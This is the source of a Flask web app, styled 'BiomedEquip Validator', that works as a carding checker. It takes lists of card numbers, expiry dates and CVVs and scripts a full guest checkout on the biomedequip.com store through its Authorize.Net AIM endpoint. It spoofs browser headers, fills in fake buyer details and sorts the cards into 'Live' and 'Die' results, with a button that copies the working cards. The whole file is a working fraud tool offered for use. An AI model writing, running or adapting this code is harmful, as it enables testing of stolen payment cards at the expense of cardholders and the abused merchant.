
# app.py - BiomedEquip Validator (Flask + Gunicorn)
import os
import re
import time
import json
import requests
import urllib.parse
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, session
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# ==================== CONFIGURACIÓN ====================
BASE_URL = "https://biomedequip.com"
PRODUCT_ID = "163"
TIMEOUT = 15

# ==================== FUNCIONES ====================
def curl_request(url, method="GET", post_data=None, cookie_jar=None, extra_headers=None, return_full=False):
    """Simula la función curl_request de PHP"""
    if extra_headers is None:
        extra_headers = []
    
    headers = {
        "Host": "biomedequip.com",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Sec-Ch-Ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"'
    }
    
    # Agregar headers extra
    for h in extra_headers:
        if ': ' in h:
            key, value = h.split(': ', 1)
            headers[key] = value
    
    session = requests.Session()
    if cookie_jar:
        session.cookies.update(cookie_jar)
    
    try:
        if method == "POST":
            response = session.post(url, data=post_data, headers=headers, timeout=TIMEOUT, verify=False)
        else:
            response = session.get(url, headers=headers, timeout=TIMEOUT, verify=False)
        
        if return_full:
            return {'body': response.text, 'header': str(response.headers)}
        return response.text
    except Exception as e:
        print(f"Error en curl_request: {e}")
        return '{"error": "' + str(e) + '"}'

def get_user_session():
    """Maneja la sesión del usuario"""
    if 'user_id' not in session:
        session['user_id'] = f"user_{int(time.time())}"
        session['created_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        session['total_checks'] = 0
        session['approved'] = 0
        session['reproved'] = 0
        session['history'] = []
        session['last_activity'] = time.time()
    return session

def update_user_stats(status):
    """Actualiza estadísticas del usuario"""
    session['total_checks'] += 1
    if status:
        session['approved'] += 1
    else:
        session['reproved'] += 1
    session['last_activity'] = time.time()

def add_history(card, status, message, time_taken):
    """Agrega al historial"""
    session['history'].append({
        'card': card,
        'status': status,
        'message': message,
        'time': time_taken,
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    if len(session['history']) > 100:
        session['history'].pop(0)

def retornar(lista, retorno, status, runtime, raw_response):
    """Función equivalente a Retornar() de PHP"""
    modelo = "~~>"
    status_text = "Live(Approved)" if status else "Die(Reproved)"
    raw_clean = re.sub(r'\s+', ' ', raw_response)[:500]
    response = f"{lista}  {modelo}  {retorno}  {modelo}  {status_text}  {modelo}  {runtime}  {modelo}  RAW: {raw_clean}"
    
    # Actualizar estadísticas
    update_user_stats(status)
    add_history(lista, status, retorno, runtime)
    
    return response

def check_card(card_data):
    """Verifica una tarjeta usando el flujo completo"""
    inicio = time.time()
    
    # Parsear datos
    dados = card_data.split('|')
    if len(dados) < 4:
        return retornar(card_data, "Formato inválido", False, "(0.00s)", "")
    
    cc = dados[0].strip()
    mes = dados[1].strip()
    ano = dados[2].strip()
    cvv = dados[3].strip() if len(dados) > 3 else "000"
    
    # Validaciones
    if len(cc) < 15 or len(cc) > 16:
        return retornar(f"{cc}|{mes}|{ano}|{cvv}", "Cartão não suportado", False, "(0.00s)", "")
    if len(cc) == 15:
        return retornar(f"{cc}|{mes}|{ano}|{cvv}", "Cartão Não Suportado", False, "(0.00s)", "")
    
    cookie_jar = {}
    
    try:
        # 1. Acessar página do produto
        curl_request(
            f"{BASE_URL}/index.php?route=product/product&product_id={PRODUCT_ID}",
            "GET",
            None,
            cookie_jar,
            [
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Upgrade-Insecure-Requests: 1"
            ]
        )
        
        # 2. Adicionar ao carrinho
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/cart/add",
            "POST",
            {'quantity': '1', 'product_id': PRODUCT_ID},
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/x-www-form-urlencoded",
                f"Origin: {BASE_URL}",
                f"Referer: {BASE_URL}/index.php?route=product/product&product_id={PRODUCT_ID}",
                "Accept: application/json, text/javascript, */*; q=0.01"
            ]
        )
        
        # 3. Acessar checkout
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/checkout",
            "GET",
            None,
            cookie_jar,
            [
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                f"Referer: {BASE_URL}/index.php?route=product/product&product_id={PRODUCT_ID}",
                "Upgrade-Insecure-Requests: 1"
            ]
        )
        
        # 4. Buscar guest form
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/guest",
            "GET",
            None,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Accept: text/html, */*; q=0.01",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout"
            ]
        )
        
        # 5. Validar guest
        guest_data = {
            'firstname': 'Eustaquio',
            'lastname': 'Murilo',
            'email': 'mdk3dy505@gmail.com',
            'telephone': '71983655723',
            'fax': '',
            'company': '',
            'customer_group_id': '1',
            'company_id': '',
            'tax_id': '',
            'address_1': 'New york',
            'address_2': '',
            'city': 'New York',
            'postcode': '10001',
            'country_id': '223',
            'zone_id': '3655',
            'shipping_address': '1'
        }
        
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/guest/validate",
            "POST",
            guest_data,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/x-www-form-urlencoded",
                f"Origin: {BASE_URL}",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout",
                "Accept: application/json, text/javascript, */*; q=0.01"
            ]
        )
        
        # 6. Buscar shipping methods
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/shipping_method",
            "GET",
            None,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Accept: text/html, */*; q=0.01",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout"
            ]
        )
        
        # 7. Validar shipping
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/shipping_method/validate",
            "POST",
            {'shipping_method': 'fedex.FEDEX_GROUND', 'comment': ''},
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/x-www-form-urlencoded",
                f"Origin: {BASE_URL}",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout",
                "Accept: application/json, text/javascript, */*; q=0.01"
            ]
        )
        
        # 8. Buscar payment methods
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/payment_method",
            "GET",
            None,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Accept: text/html, */*; q=0.01",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout"
            ]
        )
        
        # 9. Validar payment method
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/payment_method/validate",
            "POST",
            {'payment_method': 'authorizenet_aim', 'comment': '', 'agree': '1'},
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/x-www-form-urlencoded",
                f"Origin: {BASE_URL}",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout",
                "Accept: application/json, text/javascript, */*; q=0.01"
            ]
        )
        
        # 10. Confirmar
        curl_request(
            f"{BASE_URL}/index.php?route=checkout/confirm",
            "GET",
            None,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Accept: text/html, */*; q=0.01",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout"
            ],
            True
        )
        
        # 11. Enviar pagamento
        card_data_post = {
            'cc_owner': 'Eustaquio',
            'cc_number': cc,
            'cc_expire_date_month': mes,
            'cc_expire_date_year': ano,
            'cc_cvv2': cvv
        }
        
        raw_response = curl_request(
            f"{BASE_URL}/index.php?route=payment/authorizenet_aim/send",
            "POST",
            card_data_post,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/x-www-form-urlencoded",
                f"Origin: {BASE_URL}",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout",
                "Accept: application/json, text/javascript, */*; q=0.01"
            ]
        )
        
        # 12. Confirmar novamente
        raw_confirm2 = curl_request(
            f"{BASE_URL}/index.php?route=checkout/confirm",
            "GET",
            None,
            cookie_jar,
            [
                "X-Requested-With: XMLHttpRequest",
                "Accept: text/html, */*; q=0.01",
                f"Referer: {BASE_URL}/index.php?route=checkout/checkout"
            ]
        )
        
        # ==================== ANÁLISE ====================
        status = False
        retorno = "UNKNOW"
        
        # Verifica se há erro de order_id
        if 'Undefined index: order_id' in raw_response:
            time.sleep(1)
            curl_request(
                f"{BASE_URL}/index.php?route=checkout/confirm",
                "GET",
                None,
                cookie_jar,
                [
                    "X-Requested-With: XMLHttpRequest",
                    "Accept: text/html, */*; q=0.01",
                    f"Referer: {BASE_URL}/index.php?route=checkout/checkout"
                ],
                True
            )
            
            raw_response = curl_request(
                f"{BASE_URL}/index.php?route=payment/authorizenet_aim/send",
                "POST",
                card_data_post,
                cookie_jar,
                [
                    "X-Requested-With: XMLHttpRequest",
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Origin: {BASE_URL}",
                    f"Referer: {BASE_URL}/index.php?route=checkout/checkout",
                    "Accept: application/json, text/javascript, */*; q=0.01"
                ]
            )
        
        # Analisa resposta
        try:
            json_response = json.loads(raw_response)
            error_msg = json_response.get('error')
            success_keywords = ['order has been received', 'thank you', 'success', 'approved', 'payment successful', 'order placed']
            
            if error_msg:
                for keyword in success_keywords:
                    if keyword.lower() in error_msg.lower():
                        status = True
                        retorno = error_msg
                        break
                if not status:
                    status = False
                    retorno = error_msg
            
            if not status and 'response_code' in json_response:
                if json_response['response_code'] == '1':
                    status = True
                    retorno = "Aprovado"
                elif json_response['response_code'] == '2':
                    status = False
                    retorno = json_response.get('reason_text', "Declinado")
                else:
                    status = False
                    retorno = json_response.get('reason_text', "Reprovado")
        except:
            pass
        
        # Fallback
        if retorno == "UNKNOW" or not status:
            if any(x in raw_confirm2 for x in ['success', 'order_id', 'Thank you', 'Your order has been']):
                status = True
                retorno = "Aprovado"
            else:
                status = False
                if retorno == "UNKNOW":
                    retorno = "Reprovado"
        
        lista = f"{cc}|{mes}|{ano}|{cvv}"
        tempo = time.time() - inicio
        tempo_formatado = f"{tempo:.2f}s"
        
        return retornar(lista, retorno, status, f"({tempo_formatado})", raw_response)
        
    except Exception as e:
        print(f"Error en check_card: {e}")
        return retornar(f"{cc}|{mes}|{ano}|{cvv}", f"Erro: {str(e)[:50]}", False, "(0.00s)", "")

# ==================== RUTAS ====================

@app.route('/')
def index():
    """Sirve el HTML"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/check', methods=['GET'])
def api_check():
    """Endpoint para verificar tarjetas"""
    get_user_session()
    
    lista = request.args.get('lista', '')
    if not lista:
        return jsonify({'error': 'Parâmetro "lista" é obrigatório'}), 400
    
    result = check_card(lista)
    print(f"Resultado: {result}")  # Debug
    return result

@app.route('/api/stats', methods=['GET'])
def api_stats():
    """Endpoint para obtener estadísticas del usuario"""
    get_user_session()
    return jsonify({
        'user_id': session.get('user_id'),
        'created_at': session.get('created_at'),
        'total_checks': session.get('total_checks', 0),
        'approved': session.get('approved', 0),
        'reproved': session.get('reproved', 0),
        'history': session.get('history', [])[-20:],
        'last_activity': session.get('last_activity')
    })

@app.route('/api/clear', methods=['POST'])
def api_clear():
    """Limpia la sesión del usuario"""
    session.clear()
    get_user_session()
    return jsonify({'success': True})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

# ==================== HTML TEMPLATE (CORREGIDO) ====================
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BiomedEquip - Validador de Cartões</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f4e 100%);
            min-height: 100vh;
            padding: 20px;
            color: #fff;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 2px solid rgba(255,255,255,0.1);
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5em;
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: none;
        }
        
        .header p {
            color: #8892b0;
            margin-top: 10px;
        }
        
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        @media (max-width: 968px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(255,255,255,0.08);
        }
        
        .card-title {
            font-size: 1.2em;
            margin-bottom: 15px;
            color: #ccd6f6;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-title .badge {
            font-size: 0.6em;
            padding: 3px 10px;
            border-radius: 20px;
            background: rgba(255,255,255,0.1);
        }
        
        textarea {
            width: 100%;
            height: 300px;
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            color: #ccd6f6;
            padding: 15px;
            font-family: 'Consolas', monospace;
            font-size: 14px;
            resize: vertical;
            transition: border-color 0.3s;
        }
        
        textarea:focus {
            outline: none;
            border-color: #3a7bd5;
        }
        
        textarea::placeholder {
            color: #495670;
        }
        
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-primary {
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            color: #fff;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(58, 123, 213, 0.3);
        }
        
        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            color: #fff;
        }
        
        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255, 65, 108, 0.3);
        }
        
        .btn-success {
            background: linear-gradient(45deg, #00b894, #00cec9);
            color: #fff;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 184, 148, 0.3);
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }
        
        .stat-item {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-item .number {
            font-size: 2em;
            font-weight: 700;
        }
        
        .stat-item .label {
            font-size: 0.8em;
            color: #8892b0;
            margin-top: 5px;
        }
        
        .stat-item.total .number { color: #ccd6f6; }
        .stat-item.live .number { color: #00b894; }
        .stat-item.reproved .number { color: #ff416c; }
        
        .results-container {
            margin-top: 20px;
        }
        
        .result-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            margin-bottom: 8px;
            border-radius: 8px;
            background: rgba(255,255,255,0.03);
            border-left: 4px solid transparent;
            font-size: 13px;
            font-family: 'Consolas', monospace;
            transition: all 0.3s;
        }
        
        .result-item:hover {
            background: rgba(255,255,255,0.08);
        }
        
        .result-item .card-info {
            color: #ccd6f6;
            flex: 1;
        }
        
        .result-item .status {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            margin: 0 10px;
            white-space: nowrap;
        }
        
        .result-item .status.live {
            background: rgba(0, 184, 148, 0.2);
            color: #00b894;
        }
        
        .result-item .status.reproved {
            background: rgba(255, 65, 108, 0.2);
            color: #ff416c;
        }
        
        .result-item .time {
            color: #495670;
            font-size: 11px;
            white-space: nowrap;
        }
        
        .result-item .message {
            color: #8892b0;
            font-size: 12px;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .result-item.live-result {
            border-left-color: #00b894;
        }
        
        .result-item.reproved-result {
            border-left-color: #ff416c;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #495670;
        }
        
        .empty-state .icon {
            font-size: 3em;
            margin-bottom: 15px;
        }
        
        .progress-container {
            margin-top: 15px;
            display: none;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress-bar .fill {
            height: 100%;
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            width: 0%;
            transition: width 0.3s;
        }
        
        .progress-text {
            text-align: center;
            color: #8892b0;
            font-size: 12px;
            margin-top: 8px;
        }
        
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            color: #495670;
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
            background: none;
            border-top: none;
            border-left: none;
            border-right: none;
            font-size: 14px;
        }
        
        .tab:hover {
            color: #ccd6f6;
        }
        
        .tab.active {
            color: #00d2ff;
            border-bottom-color: #00d2ff;
        }
        
        .tab-content {
            display: none;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .tab-content::-webkit-scrollbar {
            width: 4px;
        }
        
        .tab-content::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.05);
        }
        
        .tab-content::-webkit-scrollbar-thumb {
            background: #3a7bd5;
            border-radius: 2px;
        }
        
        .copy-btn {
            background: none;
            border: none;
            color: #495670;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .copy-btn:hover {
            background: rgba(255,255,255,0.1);
            color: #ccd6f6;
        }
        
        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            padding: 15px 25px;
            border-radius: 10px;
            background: rgba(0,0,0,0.9);
            color: #fff;
            font-size: 14px;
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.5s;
            z-index: 1000;
        }
        
        .toast.show {
            transform: translateY(0);
            opacity: 1;
        }
        
        .toast.success {
            border-left: 4px solid #00b894;
        }
        
        .toast.error {
            border-left: 4px solid #ff416c;
        }
        
        .clear-btn {
            background: none;
            border: none;
            color: #495670;
            cursor: pointer;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            transition: all 0.3s;
        }
        
        .clear-btn:hover {
            color: #ff416c;
            background: rgba(255,65,108,0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💳 BiomedEquip Validator</h1>
            <p>Sistema de validação de cartões - Authorize.Net AIM</p>
            <p style="font-size:12px; color:#495670; margin-top:5px;">👤 Cada usuario tiene su propia sesión</p>
        </div>
        
        <div class="main-grid">
            <div class="card">
                <div class="card-title">
                    📋 Lista de Cartões
                    <span class="badge">CC|MÊS|ANO|CVV</span>
                </div>
                <textarea id="cardList" placeholder="Exemplo:&#10;4258502344700295|12|2029|789&#10;5122672267387114|12|2029|279&#10;4111111111111111|01|2028|123">4258502344700295|12|2029|789</textarea>
                <div class="btn-group">
                    <button class="btn btn-primary" id="btnProcess">▶ Processar</button>
                    <button class="btn btn-danger" id="btnClear">🗑 Limpar</button>
                    <button class="btn btn-success" id="btnCopy">📋 Copiar LIVES</button>
                </div>
                <div class="progress-container" id="progressContainer">
                    <div class="progress-bar">
                        <div class="fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text" id="progressText">Processando...</div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-title">
                    📊 Resultados
                    <span class="badge" id="totalCount">0 cartões</span>
                </div>
                
                <div class="stats">
                    <div class="stat-item total">
                        <div class="number" id="statTotal">0</div>
                        <div class="label">Total</div>
                    </div>
                    <div class="stat-item live">
                        <div class="number" id="statLive">0</div>
                        <div class="label">✅ Live</div>
                    </div>
                    <div class="stat-item reproved">
                        <div class="number" id="statReproved">0</div>
                        <div class="label">❌ Reproved</div>
                    </div>
                </div>
                
                <div class="tabs">
                    <button class="tab active" data-tab="all">📋 Todos</button>
                    <button class="tab" data-tab="live">✅ Live</button>
                    <button class="tab" data-tab="reproved">❌ Reproved</button>
                </div>
                
                <div id="tabAll" class="tab-content active">
                    <div id="resultsAll"></div>
                </div>
                <div id="tabLive" class="tab-content">
                    <div id="resultsLive"></div>
                </div>
                <div id="tabReproved" class="tab-content">
                    <div id="resultsReproved"></div>
                </div>
            </div>
        </div>
    </div>
    
    <div class="toast" id="toast"></div>

    <script>
        // ==================== CONFIGURAÇÃO ====================
        const API_URL = '/api/check';
        const STATS_URL = '/api/stats';
        
        // ==================== VARIÁVEIS ====================
        let results = [];
        let isProcessing = false;
        let currentTab = 'all';
        
        // ==================== DOM REFS ====================
        const cardList = document.getElementById('cardList');
        const btnProcess = document.getElementById('btnProcess');
        const btnClear = document.getElementById('btnClear');
        const btnCopy = document.getElementById('btnCopy');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const statTotal = document.getElementById('statTotal');
        const statLive = document.getElementById('statLive');
        const statReproved = document.getElementById('statReproved');
        const totalCount = document.getElementById('totalCount');
        const resultsAll = document.getElementById('resultsAll');
        const resultsLive = document.getElementById('resultsLive');
        const resultsReproved = document.getElementById('resultsReproved');
        const toast = document.getElementById('toast');
        
        // ==================== TABS ====================
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
                currentTab = this.dataset.tab;
                
                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                document.getElementById('tab' + currentTab.charAt(0).toUpperCase() + currentTab.slice(1)).classList.add('active');
                
                renderResults();
            });
        });
        
        // ==================== FUNÇÕES ====================
        function showToast(message, type = 'success') {
            toast.textContent = message;
            toast.className = 'toast show ' + type;
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }
        
        function updateStats() {
            const total = results.length;
            const live = results.filter(r => r.status === true).length;
            const reproved = total - live;
            
            statTotal.textContent = total;
            statLive.textContent = live;
            statReproved.textContent = reproved;
            totalCount.textContent = total + ' cartões';
        }
        
        function renderResults() {
            let filtered = results;
            if (currentTab === 'live') {
                filtered = results.filter(r => r.status === true);
            } else if (currentTab === 'reproved') {
                filtered = results.filter(r => r.status === false);
            }
            
            const container = document.getElementById('results' + currentTab.charAt(0).toUpperCase() + currentTab.slice(1));
            
            if (filtered.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="icon">📭</div>
                        <p>Nenhum resultado ${currentTab === 'all' ? '' : currentTab === 'live' ? 'aprovado' : 'reprovado'}</p>
                    </div>
                `;
                return;
            }
            
            container.innerHTML = filtered.map((r, index) => `
                <div class="result-item ${r.status ? 'live-result' : 'reproved-result'}">
                    <span class="card-info">${r.card}</span>
                    <span class="status ${r.status ? 'live' : 'reproved'}">${r.status ? '✅ LIVE' : '❌ REPROVED'}</span>
                    <span class="message">${r.message || ''}</span>
                    <span class="time">${r.time || ''}</span>
                </div>
            `).join('');
        }
        
        function getLiveCards() {
            return results.filter(r => r.status === true).map(r => r.card).join('\n');
        }
        
        async function processCards() {
            if (isProcessing) return;
            
            const list = cardList.value.trim();
            if (!list) {
                showToast('Por favor, insira uma lista de cartões', 'error');
                return;
            }
            
            const cards = list.split('\n').filter(line => line.trim() !== '');
            if (cards.length === 0) {
                showToast('Lista vazia', 'error');
                return;
            }
            
            isProcessing = true;
            btnProcess.disabled = true;
            btnProcess.textContent = '⏳ Processando...';
            progressContainer.style.display = 'block';
            results = [];
            updateStats();
            renderResults();
            
            let processed = 0;
            const total = cards.length;
            
            for (const card of cards) {
                try {
                    const url = API_URL + '?lista=' + encodeURIComponent(card.trim());
                    const response = await fetch(url);
                    const text = await response.text();
                    
                    console.log('Respuesta API:', text); // Debug
                    
                    const parsed = parseResponse(text);
                    results.push({
                        card: card.trim(),
                        status: parsed.status,
                        message: parsed.message,
                        time: parsed.time || ''
                    });
                    
                    processed++;
                    const progress = (processed / total) * 100;
                    progressFill.style.width = progress + '%';
                    progressText.textContent = `Processando ${processed}/${total}...`;
                    
                    updateStats();
                    renderResults();
                    
                } catch (error) {
                    console.error('Error:', error);
                    results.push({
                        card: card.trim(),
                        status: false,
                        message: 'Erro: ' + error.message,
                        time: ''
                    });
                    processed++;
                    updateStats();
                    renderResults();
                }
            }
            
            progressFill.style.width = '100%';
            progressText.textContent = `✅ Concluído! ${processed}/${total} cartões processados`;
            
            setTimeout(() => {
                progressContainer.style.display = 'none';
                progressFill.style.width = '0%';
            }, 2000);
            
            btnProcess.disabled = false;
            btnProcess.textContent = '▶ Processar';
            isProcessing = false;
            
            const liveCount = results.filter(r => r.status === true).length;
            showToast(`✅ Processado! ${liveCount} cartões LIVE encontrados`, 'success');
        }
        
        function parseResponse(text) {
            // Formato: CC|MÊS|ANO|CVV ~~> MENSAGEM ~~> Live(Approved) ou Die(Reproved) ~~> (TEMPO) ~~> RAW: ...
            const status = text.includes('Live(Approved)');
            
            let message = '';
            let time = '';
            
            // Extrai mensagem
            const msgMatch = text.match(/\~\~\>\s*([^\~\~]+?)\s*\~\~\>\s*(?:Live|Die)/);
            if (msgMatch) {
                message = msgMatch[1].trim();
            }
            
            // Extrai tempo
            const timeMatch = text.match(/\(([\d.]+s)\)/);
            if (timeMatch) {
                time = timeMatch[1];
            }
            
            // Se a mensagem contém "Your order has been received" ou similar
            if (message.includes('Your order has been received') || 
                message.includes('Thank you for your business') ||
                message.includes('Aprovado')) {
                return { status: true, message: message, time: time };
            }
            
            return { status: status, message: message || (status ? 'Aprovado' : 'Reprovado'), time: time };
        }
        
        // ==================== EVENTOS ====================
        btnProcess.addEventListener('click', processCards);
        
        btnClear.addEventListener('click', function() {
            cardList.value = '';
            results = [];
            updateStats();
            renderResults();
            progressContainer.style.display = 'none';
            progressFill.style.width = '0%';
            showToast('Lista e resultados limpos', 'success');
        });
        
        btnCopy.addEventListener('click', async function() {
            const liveCards = getLiveCards();
            if (!liveCards) {
                showToast('Nenhum cartão LIVE para copiar', 'error');
                return;
            }
            
            try {
                await navigator.clipboard.writeText(liveCards);
                showToast(`📋 ${liveCards.split('\n').length} cartões LIVE copiados!`, 'success');
            } catch (err) {
                const textarea = document.createElement('textarea');
                textarea.value = liveCards;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast(`📋 ${liveCards.split('\n').length} cartões LIVE copiados!`, 'success');
            }
        });
        
        cardList.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                e.preventDefault();
                processCards();
            }
        });
        
        // ==================== INICIALIZAÇÃO ====================
        updateStats();
        renderResults();
        
        console.log('💳 BiomedEquip Validator iniciado!');
        console.log('📋 Cole sua lista de cartões e clique em Processar');
        console.log('⌨️ Ctrl+Enter para processar rapidamente');
    </script>
</body>
</html>
'''

# ==================== PUNTO DE ENTRADA ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)